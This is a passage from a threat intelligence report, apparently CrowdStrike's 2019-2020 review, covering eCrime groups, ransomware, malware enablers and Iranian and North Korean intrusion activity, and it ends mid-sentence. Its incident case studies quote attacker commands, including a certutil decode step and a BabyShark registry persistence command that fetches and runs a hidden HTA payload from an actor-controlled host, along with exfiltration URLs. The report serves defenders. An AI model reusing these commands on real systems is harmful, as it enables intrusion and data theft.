TrickBot).\n\nOf note, one of the most reported ransomware threats was GandCrab, which is not\nlisted as a top threat in Figure 6. This malware is now inactive and was replaced\noperationally by REvil. The combined number of GandCrab and REvil incidents led to\nPINCHY SPIDER being the second most reported eCrime adversary in 2019. After\nPINCHY SPIDER and operators of Dharma targeted ransomware operations, the\nBGH adversaries WIZARD SPIDER, INDRIK SPIDER and DOPPEL SPIDER together\nrepresent a third of reported eCrime, with WIZARD SPIDER alone making up a\nquarter of the total.\n\n###### The combined number of GandCrab and REvil incidents led to PINCHY SPIDER being the second most reported eCrime adversary in 2019.\n\n\n-----\n\n**Remote Access Tools**\n\n**Point of Sale**\n\n**Vulnerability Exploit Kits**\n\n**Botnet**\n**Phishing Campaigns**\n\n**Criminal Forum Activity**\n\n**Spambot**\n\n**Targeted eCrime Malware**\n\n**Information Stealer**\n\n**Malware Downloaders**\n\n**Top Threats:**\n**Emotet**\n**Smoke Bot**\n**GetAndGo Loader**\n\nFigure 6.\n**Reported eCrime by Threat Type in 2019**\n\n**TINY SPIDER**\n\n**VENOM SPIDER**\n\n**SKELETON SPIDER**\n\n**CLOCKWORD SPIDER**\n\n**SCULLY SPIDER**\n\n**CARBON SPIDER**\n\n**SALTY SPIDER**\n\n**DOPPEL SPIDER**\n\n**GRACEFUL SPIDER**\n\n**COBALT SPIDER**\n\n**INDRIK SPIDER**\n\n**NARWHAL SPIDER**\n\n\n**Ransomware**\n\n**Top Threats:**\n**Ryuk**\n\n**REvil**\n**Dharma**\n\n**Banking Trojan**\n\n**Top Threats:**\n**TrickBot**\n**BokBot**\n\n**WIZARD SPIDER**\n\n**PINCHY SPIDER**\n\n**MUMMY SPIDER**\n\n\n**LUNAR SPIDER**\n**SMOKY SPIDER**\n\nFigure 7.\n**Reported eCrime by Adversary in 2019**\n\n\n-----\n\n###### Notably, one of the improvements to BitPaymer that DOPPEL SPIDER introduced was the bundling of ProcessHacker within DoppelPaymer to kill blacklisted processes.\n\n\n###### 2019 TRENDS IN TACTICS, TECHNIQUES AND PROCEDURES\n\n TERMINATING SECURITY PRODUCTS\n\nAcross multiple ransomware cases, CrowdStrike observed perpetrators consistently\nattempting to terminate security software, such as endpoint protection products or\nsecurity information and event management (SIEM) alert forwarders. Ransomware\noperators — including Dharma and Phobos affiliates — have primarily used two\npublicly available utilities for this purpose: PCHunter and ProcessHacker. Notably,\none of the improvements to BitPaymer that DOPPEL SPIDER introduced was the\nbundling of ProcessHacker within DoppelPaymer to kill blacklisted processes. These\npowerful utilities allow actors to not only view and terminate processes, but also\ndirectly interface with the Windows kernel itself. Other free utilities for terminating\nsecurity software include PowerTool x64, GMER, Total Uninstall Portable and\nDefender Control.\n\n###### DNS TUNNELING\n\nThe use of the DNS protocol for command-and-control (C2) communications is a\nuseful tactic in the event that other common internet protocols are disabled or closely\ninspected in a corporate environment. Although this is not a new technique, CrowdStrike\nIntelligence identified some significant examples of adversaries adopting this TTP.\nIn September 2019, CARBON SPIDER began using a variant of its first-stage Harpy\nbackdoor that is capable of using DNS as a backup channel for C2 if HTTP fails.\n\n###### USE OF COMPROMISED SITES HOSTING WORDPRESS CMS\n\nIn Q3 2019, CrowdStrike Intelligence noted an overall increase in criminal actors\nusing compromised websites hosting individual instances of the WordPress\ncontent management system (CMS). In many cases, these sites were used to\ndeliver malware, including REvil, MUMMY SPIDER’s Emotet, and QakBot. Sites\ncompromised in this fashion have also been implicated in possible credential\nharvesting operations. On Sept. 25, 2019, CrowdStrike Intelligence identified\nseveral malicious phishing pages designed to impersonate a Microsoft Office 365\nlanding page. The majority of these pages were hosted on legitimate domains likely\ncompromised through vulnerabilities in CMS plugins.\n\n\n-----\n\n###### In October 2019, CrowdStrike Intelligence identified multiple Emotet spam campaigns conducted by MUMMY SPIDER using a technique referred to as email thread hijacking.\n\n\n###### DROPPER DOCUMENT BUILDERS AND DISTRIBUTION SERVICES\n\nIn 2019, CrowdStrike Intelligence tracked the development of numerous dropper\ndocument families, given the names Gemini, Leo and Virgo. These were most\nnotably used by COBALT SPIDER but were not exclusive to this adversary. COBALT\nSPIDER’s use of Leo documents featured theme and code overlap with a CARBON\nSPIDER Harpy campaign. Analysis from late 2019 revealed that Virgo documents\nwere widespread and linked to the use of numerous information stealers, including\nFormBook, Pony and LokiBot.\n\nFrom July to September 2019, CrowdStrike Intelligence noted an increase in the use\nof a document family called TandemDrop. These malicious, macro-enabled documents\nare capable of distributing multiple malware variants from a single document.\nObserved pairings delivered by TandemDrop documents include:\n\n\u0007Gozi ISFB and REvil\n\n\u0007TrickBot and Gozi ISFB\n\n\u0007Vidar Stealer and Gozi ISFB\n\n\u0007Predator the Thief Stealer and an unconfirmed payload\n\nTandemDrop has also been used to deliver a single malware family. One such\ncampaign distributed MUMMY SPIDER’s Emotet malware in September 2019.\n\n###### EMAIL THREAD HIJACKING\n\nIn October 2019, CrowdStrike Intelligence identified multiple Emotet spam campaigns\nconducted by MUMMY SPIDER using a technique referred to as email thread\nhijacking. Email thread hijacking exploits email content previously collected by\nEmotet’s email harvester module. After a victim’s email content has been stolen,\nMUMMY SPIDER identifies email threads by the subject line (e.g., Re:) and formulates\na reply to the thread. This tactic increases the likelihood that a recipient will open a\nmalicious attachment (or click a link) because the sender appears to be someone that\nthey previously communicated with, and the subject line matches a prior conversation\nthread that they had with that person. Given that BGH actors WIZARD SPIDER,\nINDRIK SPIDER and DOPPEL SPIDER are all customers of MUMMY SPIDER, Emotet\ncampaigns leading to the compromise of enterprise networks may support targeted\nransomware operations.\n\n\n-----\n\n###### ECRIME ENABLERS\n\nCrowdStrike Intelligence tracks enablers as adversaries that specialize in the\ndelivery or development of malware. Developers monetize their malware-as-aservice (MaaS) operations through the sale and/or rental of malware. Distributors\nfall into two categories: operators of spambots and operators of download services.\nExisting between these two categories are adversaries that develop criminal\nloaders. An example of this operational model is SMOKY SPIDER, which develops\nthe criminal loader known as Smoke Bot, which is sold on underground forums and\nhas been observed supporting the distribution of numerous malware families.\n\nAdversary Operational Model Last Active\n\nDownload-as-a-Service (DaaS)/Banking\nLUNAR SPIDER Jan 2020\nTrojan\n\nMONTY SPIDER Spambot Apr 2019 — Inactive\n\nMUMMY SPIDER DaaS Jan 2020\n\nNARWHAL SPIDER Spambot Dec 2019\n\nNOCTURNAL SPIDER MaaS May 2019\n\nSCULLY SPIDER DaaS/Banking Trojan Jan 2020\n\nSMOKY SPIDER DaaS Jan 2020\n\nVENOM SPIDER MaaS Dec 2019\n\nTable 3.\n**Adversaries Tracked as eCrime Enablers in 2019**\n\n###### DISTRIBUTION SERVICES SUPPORTING ESTABLISHED ECRIME ADVERSARIES\n\nDownload-as-a-service (DaaS) operations began a transformation in 2017 when\nMUMMY SPIDER shifted the operation of Emotet from a banking trojan to a\ndistribution service. In 2019, further evidence of what has been observed since then\nsuggests that LUNAR SPIDER (operator of BokBot) and SCULLY SPIDER (operator\nof DanaBot) are making similar moves away from banking trojan operations and\ntoward download services supporting the distribution of third-party malware.\n\nThe success of these adversaries has not been matched by other actors. Spambots\ncontinued to decline in 2019, with MONTY SPIDER’s CraP2P spambot falling silent\nin April. NARWHAL SPIDER’s operation of Cutwail v2 was limited to country-specific\nspam campaigns, although late in 2019 there appeared to be an effort to expand by\nbringing in INDRIK SPIDER as a customer.\n\n|Adversary LUNAR SPIDER|Operational Model Download-as-a-Service (DaaS)/Banking Trojan|Last Active Jan 2020|\n|---|---|---|\n|MONTY SPIDER|Spambot|Apr 2019 — Inactive|\n|MUMMY SPIDER|DaaS|Jan 2020|\n|NARWHAL SPIDER|Spambot|Dec 2019|\n|NOCTURNAL SPIDER|MaaS|May 2019|\n|SCULLY SPIDER|DaaS/Banking Trojan|Jan 2020|\n|SMOKY SPIDER|DaaS|Jan 2020|\n|VENOM SPIDER|MaaS|Dec 2019|\n\n\n-----\n\n**TINY SPIDER**\n\nTinyPoS Operates\n\nOperates\n\n**MUMMY SPIDER** **LUNAR SPIDER**\n\n|Oper|ates|\n|---|---|\n\n|Oper|ates|\n|---|---|\n\n\nBitPaymer Operates\n\nDistributes\n\nDistributes\nDistributes Distributes\n\n**DOPPEL SPIDER** Smoke Bot\n\nOperates Distributes Distributes DanaBot\n\nDoppelDridex\n\nOperates Distributes Distributes\n\nOperates Operates\n\nDoppelPaymer GandCrab REvil\n\n**SMOKY SPIDER** **SCULLY SPIDER**\n\nOperates Operates\n\n**PINCHY SPIDER**\n\nFigure 8.\n**Mapping of Observed Relationships Between eCrime Adversaries**\n\n\nRyuk Ransomware\n\n|Oper|ates|\n|---|---|\n\n|Col1|Col2|Col3|Col4|Col5|Col6|\n|---|---|---|---|---|---|\n|O|perates|||Operate|s|\n|||||||\n\n\n-----\n\n###### VENOM SPIDER: A MAAS OPERATIONAL MODEL\n\nVENOM SPIDER is the developer of a large toolset that includes SKID, VenomKit\nand Taurus Loader. Under the moniker “badbullzvenom,” the adversary has been\nan active member of Russian underground forums since at least 2012, specializing\nin the identification of vulnerabilities and the subsequent development of tools for\nexploitation, as well as for gaining and maintaining access to victim machines and\ncarding services.

Even MaaS vendors have found\nthemselves assembling and offering ransomware modules to go with their suite of\ntools, in an effort to skim a profit from the desires of less sophisticated but eager\nactors. It remains to be seen if these endeavors will provide lasting security for\nthese operations. The future — and the largest cut of profits — seems destined\nto belong to those actors that have been able to master multiple methods of\nmonetizing their skills and tools.\n\nStill, MaaS developers may prefer to stay out of the limelight, as suggested by VENOM\nSPIDER’s judicious cherry-picking of customers. Pleasing a few selected operators\ncarries less risk than hands-on-keyboard activity within a victim’s network, as well as\narguably aiding in protecting the developer’s operational security.\n\n###### The future — and the largest cut of profits — seems destined to belong to those actors that have been able to master multiple methods of monetizing their skills and tools.\n\n\n-----\n\n###### TARGETED ECRIME ACTIVITY\n\nHistorically, CrowdStrike Intelligence has tracked a subset of eCrime adversaries\nthat are conducting wire fraud and/or compromising point-of-sale (PoS) systems at\nscale. In 2016 and 2017, their operations were notable because they targeted large\nenterprises using initial exploitation, lateral movement and exfiltration techniques\ncommonly associated with nation-state actors. With the rise and dominance of BGH,\nwhich also relies on these methods, the relative uniqueness of targeted eCrime is no\nlonger as apparent. In fact, the original BGH group BOSS SPIDER was tracked as a\ntargeted eCrime adversary until 2018.\n\nDespite the changing criminal landscape, targeted eCrime adversaries continue to\nevolve and expand their operations. They are distinguished from BGH adversaries\nby their methods of monetization, which generally do not include enterprise-wide\nransomware infections. One noted exception to this is GRACEFUL SPIDER, which has\nused Clop ransomware against victims. CrowdStrike Intelligence continues to evaluate\nactivity from this actor but tracks it as a targeted eCrime adversary at this time due to\nits PoS compromises. The other named adversaries that have been linked to PoS data\ncompromises are CARBON SPIDER, TINY SPIDER and SKELETON SPIDER.\n\nThe adversaries that are specifically targeting financial institutions monetize\nthe theft of large sums via wire fraud or ATM cash-outs. In 2019, CrowdStrike\nIntelligence observed an increase in such campaigns, with activity expanding\nbeyond the U.S., Canada and Europe to affect South and Central America and\nAfrica. Adversaries employing this operational model include COBALT SPIDER,\nANTHROPOID SPIDER and WHISPER SPIDER.\n\n###### Despite the changing criminal landscape, targeted eCrime adversaries continue to evolve and expand their operations.\n\n\n-----\n\n###### ACTIVE ADVERSARIES\n\nAdversary Ops Tempo Description\n\nIn the second half of 2019, GRACEFUL SPIDER\n\nGRACEFUL conducted broad spam campaigns on a weekly basis.\nHigh\nSPIDER These campaigns used malicious macro-enabled\n\ndocuments to drop GetAndGo Loader.\n\nThrough 2019, COBALT SPIDER used spear-phishing\nto deliver a diverse suite of droppers, all of which\nultimately downloaded the group’s custom COBINT\n\nCOBALT Medium\nmalware.

GetAndGo Loader has delivered FlawedAmmyy, the Foundation\nmalware framework and, most recently, GRACEFUL SPIDER’s custom Remote\nAccess Tool (RAT) SDBBot. SDBBot has three main parts: The installer deploys the\nother components and creates an auto-start execution point (ASEP) on the system;\nan intermediate component called RegCodeLoader is used by the ASEP to load the\nmalware; and the last component is the malicious RAT payload.\n\nGRACEFUL SPIDER conducts these campaigns at greater scale and frequency\nthan other targeted eCrime actors. Rather than focusing specifically on a particular\nindustry, the adversary has targeted organizations in almost every sector across the\nglobe. CrowdStrike Intelligence observed efforts to more selectively target victims in\nOctober 2019, when the actor introduced victim IP address geolocation filtering. For\nexample, certain malicious landing pages only delivered malware to South Koreabased IP addresses (on October 23 and 24, 2019). This tactic has the added benefit\nof interfering with automated security tools and sandboxes that do not have VPN\nexit points in a targeted country.\n\n###### COBALT SPIDER’S VARIATIONS IN DELIVERY METHODS\n\nIn 2019, COBALT SPIDER remained focused almost exclusively on the financial\nsector. This group has used a diverse variety of dropper files to deliver the COBINT\nbackdoor. These droppers have included: Gemini and Leo macro documents; Virgo\nexploit documents; Word documents containing OLE objects; Cancer JavaScripts;\nNSIS files; backdoored versions of legitimate web browser updates; and LNK files.\nIn addition to regularly impersonating banks, COBALT SPIDER has repeatedly used\nsocial engineering lures related to SWIFT (Society for Worldwide Interbank Financial\nTelecommunication) and the European Central Bank (ECB). The adversary has also\nemployed infrastructure impersonating the ECB.\n\nIt is probable that COBALT SPIDER is also expanding its targeting scope beyond\nEuropean and North American financial institutions to include Central and South America.\n\n###### CrowdStrike Intelligence observed efforts to more selectively target victims in October 2019, when GRACEFUL SPIDER introduced victim IP address geolocation filtering.\n\n\n-----\n\n**LNK**\n**File**\n\n**NSIS** **LEO**\n**Dropper** **Sep-Oct 2019**\n\n###### CANCER\n**July-Nov 2019**\n\nJuly 2019\n\n\nApril 2019\n\n\nFigure 10.\n**COBALT SPIDER Delivery Mechanisms**\n\n###### LOOKING FORWARD\n\nIn 2020, targeted eCrime groups will almost certainly continue to directly conduct\noperations against financial institutions and other companies. CrowdStrike\nIntelligence assesses with moderate confidence that in 2020, targeted eCrime\ngroups will likely increase campaigns against victims outside of Europe and the\nUnited States. COBALT SPIDER will likely continue to develop or obtain a diverse\nrange of first-stage malware for use in COBINT campaigns.\n\n\n###### COBALT SPIDER DELIVERY MECHANISMS\n\n GEMINI\n**Feb-Aug 2019**\n\nJan 2019\n\n\n-----\n\n###### TARGETED INTRUSION\n\nCrowdStrike tracks numerous targeted intrusion adversaries based around the\nworld. Activity in this section highlights significant events attributed to actor groups\nfrom China, Iran, Russia, DPRK, India, Pakistan and Vietnam. Targeted intrusion\nactivity in 2019 featured high-volume operations from DPRK-associated adversaries,\nespecially VELVET CHOLLIMA and LABYRINTH CHOLLIMA. Chinese adversary\nactivity was particularly elevated against telecommunication entities. Multiple\nRussian adversaries, including PRIMITIVE BEAR and FANCY BEAR, were linked to\nthe targeting of Ukraine. Amid a year of rising tension between Iran and the U.S.,\nIranian adversary activity included campaigns using job and recruitment themes\nspoofing a U.S.-based defense contractor, suggesting an increasing focus on\ngovernment and defense sector targeting.\n\nReported targeted intrusion activity in 2019 was evenly distributed across incidents\nlinked to Russian, Iranian and North Korean adversaries:\n\nBEAR - 22%\n\nKITTEN - 21%\n\nCHOLLIMA - 18%\n\nPANDA - 15%\n\nLEOPARD/TIGER (Indian subcontinent) - 14%\n\nFigure 11 shows the relatively high operational pace of VELVET CHOLLIMA,\nLABYRINTH CHOLLIMA and PRIMITIVE BEAR.\n\n###### Targeted intrusion activity in 2019 featured high-volume operations from DPRK-associated adversaries, especially VELVET CHOLLIMA and LABYRINTH CHOLLIMA.\n\n\n-----\n\n**STARDUST CHOLLIMA** **BERSERK BEAR**\n\n\n**VENOMOUS BEAR**\n\n**WICKED PANDA**\n\n**FANCY BEAR**\n\n**STATIC KITTEN**\n\n**REFINED KITTEN**\n\n**PRIMITIVE BEAR**\n\n**MYTHIC LEOPARD**\n\n**LABYRINTH CHOLLIMA**\n\nFigure 11.\n**Targeted Intrusions by Adversary in 2019**\n\n\n**OCEAN BUFFALO**\n\n**VICEROY TIGER**\n\n**IMPERIAL KITTEN**\n\n**RICOCHET CHOLLIMA**\n\n**EMISSARY PANDA**\n\n**MUSTANG PANDA**\n\n**LOTUS PANDA**\n\n**SILENT CHOLLIMA**\n\n**PIRATE PANDA**\n\n**HELIX KITTEN**\n\n**QUILTED TIGER**\n\n**CHARMING KITTEN**\n\n**REMIX KITTEN**\n\n**STONE PANDA**\n\n**KRYPTONITE PANDA**\n\n**COZY BEAR**\n\n**VELVET CHOLLIMA**\n\n\nAs noted in the China section later in this report, activity with suspected ties to the\nPeople’s Republic of China is much more prevalent than what could be attributed\nto individual named adversaries.

These disruptions included a\nrange of purported hacktivist leaks on the activity, tools and personnel of three\nseparate state-nexus adversaries, as well as industry and government publications\nidentifying that one of those adversaries previously had been compromised by\na Russian state-nexus adversary. Following these disruptive incidents, tracked\nadversaries responded in a variety of ways, including adopting changes in TTPs,\nscaling back activity or continuing to operate with largely unchanged behavior.\nNotable changes in TTPs included an increased reliance on social media for\nreconnaissance and initial payload delivery, use of employment-themed lure\ncontent and a greater attention to operational security in the crafting of payloads\nand structure of malware C2 channels.\n\nWhile activity earlier in the year focused on countries in the Middle East and\nNorth Africa (MENA) region, the latter half of 2019 saw a pronounced shift in\ntargeting toward entities in the U.S., likely in response to an extended spike in\ntension between Iran and the U.S. over events in the Persian Gulf that began in\nMay 2019. Other relevant incidents included a domestic internet shutdown in Iran\nbeginning in November 2019 in response to a large-scale outbreak of protests\nacross the country following a government decision to increase the price of fuel.\nThis was accompanied by allegations of a widespread campaign by the regime\ntargeting protesters, journalists and dissidents across social media and encrypted\nmessaging platforms.\n\nIndustry reporting described Iran’s continuing deployment of destructive malware,\nnamely wipers, against specific entities in the Middle East region. However, these\nactivities appeared to be limited in scale compared to past Iran-nexus destructive\noperations utilizing the Shamoon wiper, and they could not be attributed to Iran with\nthe same confidence or detail as past destructive activities.\n\n\n-----\n\n##### IRAN_\n\n\n###### ACTIVE ADVERSARIES\n\nAdversary Ops Tempo Description\n\nREFINED MediumKITTEN High\n\ntools.\n\nIMPERIAL\nMedium\nKITTEN\n\nCHARMING MediumKITTEN Low\n\neducational platforms.\n\nHELIX MediumKITTEN Low\n\nSTATIC MediumKITTEN Low\n\ninclude the energy sector.\n\nREMIX\nLow\nKITTEN\n\nTable 6.\n**Summary of Activity Attributed to Iranian Adversaries**\n\n|Adversary REFINED KITTEN|Ops Tempo Medium- High|Description In June 2019, REFINED KITTEN conducted a brief but high-tempo campaign, likely in relation to ongoing tensions between Iran and the United States.

The adversary resumed at least a portion of its operations in June 2019, although with changes in its operational behavior.|\n|STATIC KITTEN|Medium- Low|Consistent with its past behavior, STATIC KITTEN was observed regularly modifying its operational behavior and tooling during Spring 2019. Despite being targeted in a limited leak of materials related to its operations, the adversary remained active at a lower operational tempo. It was also observed expanding its targeting to include the energy sector.|\n|REMIX KITTEN|Low|Publicly reported as “Chafer” and “APT39,” REMIX KITTEN maintained an exceptionally low operational tempo throughout 2019, possibly as a result of being the target of an extended leak relating to its operations, capabilities and personnel.|\n\n\n-----\n\n##### IRAN_\n\n###### OVERWATCH FEATURE_\n\n\n###### HELIX KITTEN INTRUSION\n\n Overview\n\nIn Fall 2019, Falcon OverWatch observed a targeted intrusion in which the\nvictim, who had initially deployed the CrowdStrike Falcon platform to a limited\nendpoint estate, was notified by the OverWatch team about a potential intrusion\nthat predated the installation of the Falcon sensor. This activity included an\nunidentified actor remotely accessing the network with valid credentials,\nharvesting credentials, performing host and network reconnaissance and\nutilizing web shells to establish persistence. The deployed web shell was\na variant identified in industry reporting as IntrudingDivisor. CrowdStrike\nIntelligence attributes this activity and IntrudingDivisor to the Iranian state-nexus\nadversary HELIX KITTEN with high confidence.\n\nThe adversary used a combination of built-in operating system utilities, publicly\navailable software and custom-built tools to execute malicious activities on the\nnetwork. Throughout the intrusion, the OverWatch team noted the extensive\nuse of RDP, rundll32, certutil, a command-line tool used to display user\nand group information, and custom web shells used for reconnaissance, lateral\nmovement and execution of tasks.\n\n###### Initial Observations\n\nThreat hunting initially uncovered malicious activity when hunters observed\nthe adversary establish an RDP session and proceed to harvest credentials by\ndumping the memory of the LSASS process with built-in Task Manager. The\nactor also deployed a simple encoded command-line Active Directory (AD)\nscanner to display user and group information. The scanner’s file extension was\nsaved as C:\\Temp\\[REDACTED]\\1.txt and was decoded via certutil as\nfollows prior to execution:\n\ncertutil.exe -decode 1.txt l.exe\n\nThe AD scanner was then executed in the following format:\n\nl.exe administrators \\\\[REDACTED IP ADDRESS]\n\nFurthermore, OverWatch identified that the adversary used the combination of valid\ncredentials and RDP to install the IntrudingDivisor web shell to three mail servers.\n\n\n-----\n\n##### IRAN_\n\n###### OVERWATCH FEATURE_\n\n\n###### Notable Adversary Behavior\n\nDuring the course of its operation, the adversary deployed a web shell\nwith the filename logoff.aspx and subsequently logged into that\nweb shell from an external address. Technical analysis of the web shell\nidentified it as a variant of a tool previously identified in industry reporting\nas IntrudingDivisor. IntrudingDivisor is a multifunction web shell that relies\non specific numeric inputs to execute arbitrary commands, write data to a\nspecified file, alter access times of a specified file and read a specified file.\nThe tool’s industry moniker is based on its use of a specific division-based\nsystem of numeric inputs for actor authentication and command execution.\n\n###### Conclusions and Recommendations\n\nThe web shell identified during the intrusion largely conforms with the\nindustry reporting, but it does exhibit some notable differences. For\ninstance, the sample identified in this intrusion does not automatically\nlog the time, the client IP address or the user agent string, as discussed\nin industry reports. Despite the difference in logging functionality, this\nsample uses some of the same code to perform the same functionality\nand employs the same hard-coded constants for authentication/command\nexecution as other versions of IntrudingDivisor. Industry reporting\ndescribes IntrudingDivisor as often deployed in concert with the TwoFace\nweb shell, which CrowdStrike Intelligence attributes to the Iranian statenexus adversary HELIX KITTEN.\n\nMitigation steps to defend against threats from this intrusion include\nmonitoring for unexpected processes interacting with LSASS. Given the\nfact that the adversary was using valid credentials over RDP, defenders\nshould also continuously monitor for unusual account behavior. In regard\nto the web shell activity, employ process monitoring on web servers to\nidentify suspicious actions or file access. Defenders should also review\nauthentication logs and any unexpected traffic on the server.\n\n\n-----\n\n##### IRAN_\n\n\n###### LOOKING FORWARD\n\nCrowdStrike Intelligence assesses with high confidence that Iranian adversaries\nwill continue to use cyber espionage to support traditional intelligence collection\nfrom a variety of public and private entities, with a particular emphasis on the MENA\nregion and North America. The primary focus of this activity is likely to be driven\nby both strategic and directed intelligence requirements related to furthering Iran’s\ngeostrategic goals, counteracting the effects of economic sanctions and maintaining\nthe stability of the regime. The latter requirements will almost certainly include\ncontinued targeting of figures critical of the regime, both within Iran and abroad,\nparticularly dissidents and journalists, and may extend to disinformation campaigns\nutilizing social media, similar to activity against American audiences during 2019 that\nwas reported to have an Iranian nexus.\n\nBased on activity observed in 2019, Iranian cyber espionage appears to be\nincreasingly tasked to support gaps in military-related intelligence requirements\nand achieve positional access to enable the compromise of third parties. With\nthat in mind, defense, maritime, telecommunications and information technology\norganizations in the MENA region will likely be of particular interest to Iranian\nadversaries in 2020.\n\nDomestically, recent protests across the country and the run-up to elections\nin February 2020 have exposed significant political fissures within the Iranian\nbody politic. As a result, it is likely that the regime will attempt to strengthen its\ndominance over the information space available to its citizens, including through\nfurther development of its national intranet and more intense targeting of internal\nopposition figures, dissidents abroad and certain established political elements.\n\n###### Based on activity observed in 2019, Iranian cyber espionage appears to be increasingly tasked to support gaps in military-related intelligence requirements and achieve positional access to enable the compromise of third parties.\n\n\n-----\n\n###### Multiple incidents targeted India, with some activity further supporting the assessment that the DPRK is conducting economic espionage against key industries. Financial sector targeting is believed to be worldwide.\n\n\n## DPRK\n\nDPRK-based targeted intrusions represent some of the most active operations in\n2019. Both VELVET CHOLLIMA and LABYRINTH CHOLLIMA sustained an elevated\noperational pace throughout the year. This tempo was not only represented by\nmultiple observed campaigns but also by sustained development of tools and\ntechniques. In the case of LABYRINTH CHOLLIMA, the adversary demonstrated the\nability to compromise multiple platforms and operating systems, including Windows,\nLinux, macOS and Android.\n\nEntities within the Republic of Korea (ROK, or South Korea) continued to be of\nstrategic interest, particularly for RICOCHET CHOLLIMA, VELVET CHOLLIMA\nand LABYRINTH CHOLLIMA. However, VELVET CHOLLIMA also targeted the\nU.S. and Japan through intelligence-gathering operations focused on collecting\ninformation on nuclear and sanctions issues. Multiple incidents targeted India,\nwith some activity further supporting the assessment that the DPRK is conducting\neconomic espionage against key industries. Financial sector targeting is believed\nto be worldwide.\n\nNot all Korea-based activity identified in 2019 could be affirmatively attributed to a\nnamed DPRK adversary. In July 2019, Falcon OverWatch identified a NOKKI malware\nsample, which precipitated detailed technical analysis of this malware. Despite\nprevious links to the ROK-based SHADOW CRANE, this technical analysis led to\nthe assessment that the malware was likely an adversary with a nexus to the DPRK\nregime, with at least some relationship to VELVET CHOLLIMA. A Chrome zero-day\nvulnerability (CVE-2019-13720) that was reported in November 2019 posed the same\nproblem for attribution. TTPs associated with this activity were observed from both\nSHADOW CRANE and RICOCHET CHOLLIMA, and both of these adversaries are\nsuspected of having a similar target scope that includes journalists and academics\ninvolved in Korean policy.\n\n\n-----\n\n###### DPRK_\n\n\n###### ACTIVE ADVERSARIES\n\nAdversary Ops Tempo Description\n\nThe fast-paced operations attributed to VELVET\nCHOLLIMA observed in late 2018 continued\nthrough 2019. Throughout the year, CrowdStrike\n\nVELVET\nHigh Intelligence identified evidence suggesting that\nCHOLLIMA\n\nthis adversary is engaging in currency-generation\noperations through its targeting of cryptocurrency\nusers and/or exchanges.\n\nLABYRINTH CHOLLIMA introduced a steady\nLABYRINTH\nHigh stream of new tools in 2019, suggesting that this\nCHOLLIMA\nadversary is in a constant state of development.\n\nRICOCHET CHOLLIMA targeted likely defectors\nfrom DPRK and/or organizations in the ROK\n\nRICOCHET\nMedium associated with assisting defectors, although\nCHOLLIMA\n\nadditional evidence has suggested its targeting\ncan be much broader in scope.\n\nSTARDUST CHOLLIMA activity in April and May\n2019 targeted financial institutions in a continuation\n\nSTARDUST of operations observed in 2018. This adversary\nMedium\nCHOLLIMA is possibly supported by HUMINT operations,\n\nwith reports of actors using social engineering\ntechniques over the phone.\n\nReporting of SILENT CHOLLIMA’s 2019 activity\nSILENT\nLow revealed a recent focus on targeting financial and\nCHOLLIMA\nenergy sector entities in India.\n\nTable 7.\n**Summary of Activity Attributed to North Korean Adversaries in 2019**\n\n|Adversary VELVET CHOLLIMA|Ops Tempo High|Description The fast-paced operations attributed to VELVET CHOLLIMA observed in late 2018 continued through 2019.

This adversary is possibly supported by HUMINT operations, with reports of actors using social engineering techniques over the phone.|\n|SILENT CHOLLIMA|Low|Reporting of SILENT CHOLLIMA’s 2019 activity revealed a recent focus on targeting financial and energy sector entities in India.|\n\n\n-----\n\n###### DPRK_\n\n In addition to supporting currency generation, LABYRINTH CHOLLIMA’s targeting of cryptocurrency exchanges could support espionage- oriented efforts designed to collect information on users or cryptocurrency operations and systems.\n\n\n###### SECTOR HIGHLIGHT:  FINANCE AND CRYPTOCURRENCY\n\nAs in 2018, CrowdStrike Intelligence once again observed North Korean\ntargeting of the finance and cryptocurrency sectors in 2019. The extent of\nthis targeting includes activity from all named DPRK-affiliated adversaries\n— from STARDUST CHOLLIMA’s breach of payment processors to smallerscale cryptocurrency theft in VELVET CHOLLIMA’s deployment of GoldStamp\nmalware. LABYRINTH CHOLLIMA sustained routine operations against\ncryptocurrency exchanges, and recent reporting detailed SILENT CHOLLIMA’s\nuse of DTrack malware to compromise ATMs in India.\n\nPrior to 2019, RICOCHET CHOLLIMA was not reported as conducting\nintrusions against this sector. However, in mid-May 2019, open sources\nreported that RICOCHET CHOLLIMA used a variant of Nimbus malware against\nsuspected financial entities in Vietnam, Hong Kong, Russia and DPRK in late\n2018. While it is unclear if this operation represented an attempt at theft of\nfunds, this activity, if accurate, would represent a significant expansion in the\nadversary’s known target scope.\n\nTaken together, these operations strongly suggest that all DPRK groups\nrepresent some level of threat to the financial sector. Not only are these\nadversaries engaging in small-scale currency generation activity, which\nlikely funds their own operations, they are also possibly contributing to\nDPRK’s ability to evade international sanctions and finance its foreign and\ndomestic policy initiatives. In addition to supporting currency generation,\nLABYRINTH CHOLLIMA’s targeting of cryptocurrency exchanges could\nsupport espionage-oriented efforts designed to collect information on users\nor cryptocurrency operations and systems. DPRK has been developing its\nown cryptocurrency to further circumvent sanctions. Similarly, RICOCHET\nCHOLLIMA’s targeting of financial entities could also represent efforts\ndesigned to obtain information on the finances of a person or organization of\ninterest to DPRK’s intelligence services.\n\n\n-----\n\n###### DPRK_\n\n\n-----\n\n###### DPRK_\n\n\n###### OVERWATCH FEATURE_\n\n\nThis payload decoded to a VBScript, which was Stage 1 of the VELVET CHOLLIMA\nBabyShark implant. The script also configured a persistence mechanism by setting\nan autorun key to download and execute the second-stage HTA downloader\nwhenever cmd.exe is run:\n\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Command Processor\"\n/v AutoRun /t REG_SZ /d \"powershell.exe start-process\n-windowstyle hidden -filepath mshta.exe https://bit-albania[.]\ncom/[REDACTED]/Drfwj.hta\" /f\n\nThe script then modified registry settings associated with Microsoft Office to\nsuppress VBA warnings regarding macros, doing so by forcing the creation of the\nsame associated Registry value for three different versions of MS Word. Rather\nthan first checking which version of MS Office was installed, the script ran registry\nmodification commands for multiple versions to ensure the changes took effect.\nThe script also performed basic discovery commands. Output from the discovery\ncommands was saved to %APPDATA%\\Microsoft\\ttmp.log before being base64encoded and uploaded to:\n\nhttps://bit-albania[.]com/BackUps/[REDACTED]/upload.php\n\nFinally, the script created scheduled tasks with SYSTEM-level privileges that\nessentially launch cmd.exe to trigger the persistence mechanism.\n\nThe second-stage HTA downloader, Drfwj.hta, then retrieved the second stage of\nthe BabyShark implant from:\n\nhttps://bit-albania[.]com/BackUps/[REDACTED]/expres.php?op=2\n\nThe second stage was a VBScript that executed more host discovery and checked\nif the adversary wanted to deploy additional modules.\n\n###### Conclusions and Recommendations\n\nDue to the organization’s timely response in containing the host, further malicious\nactivity, including credential dumping or lateral movement, was not observed.\nLike many other targeted 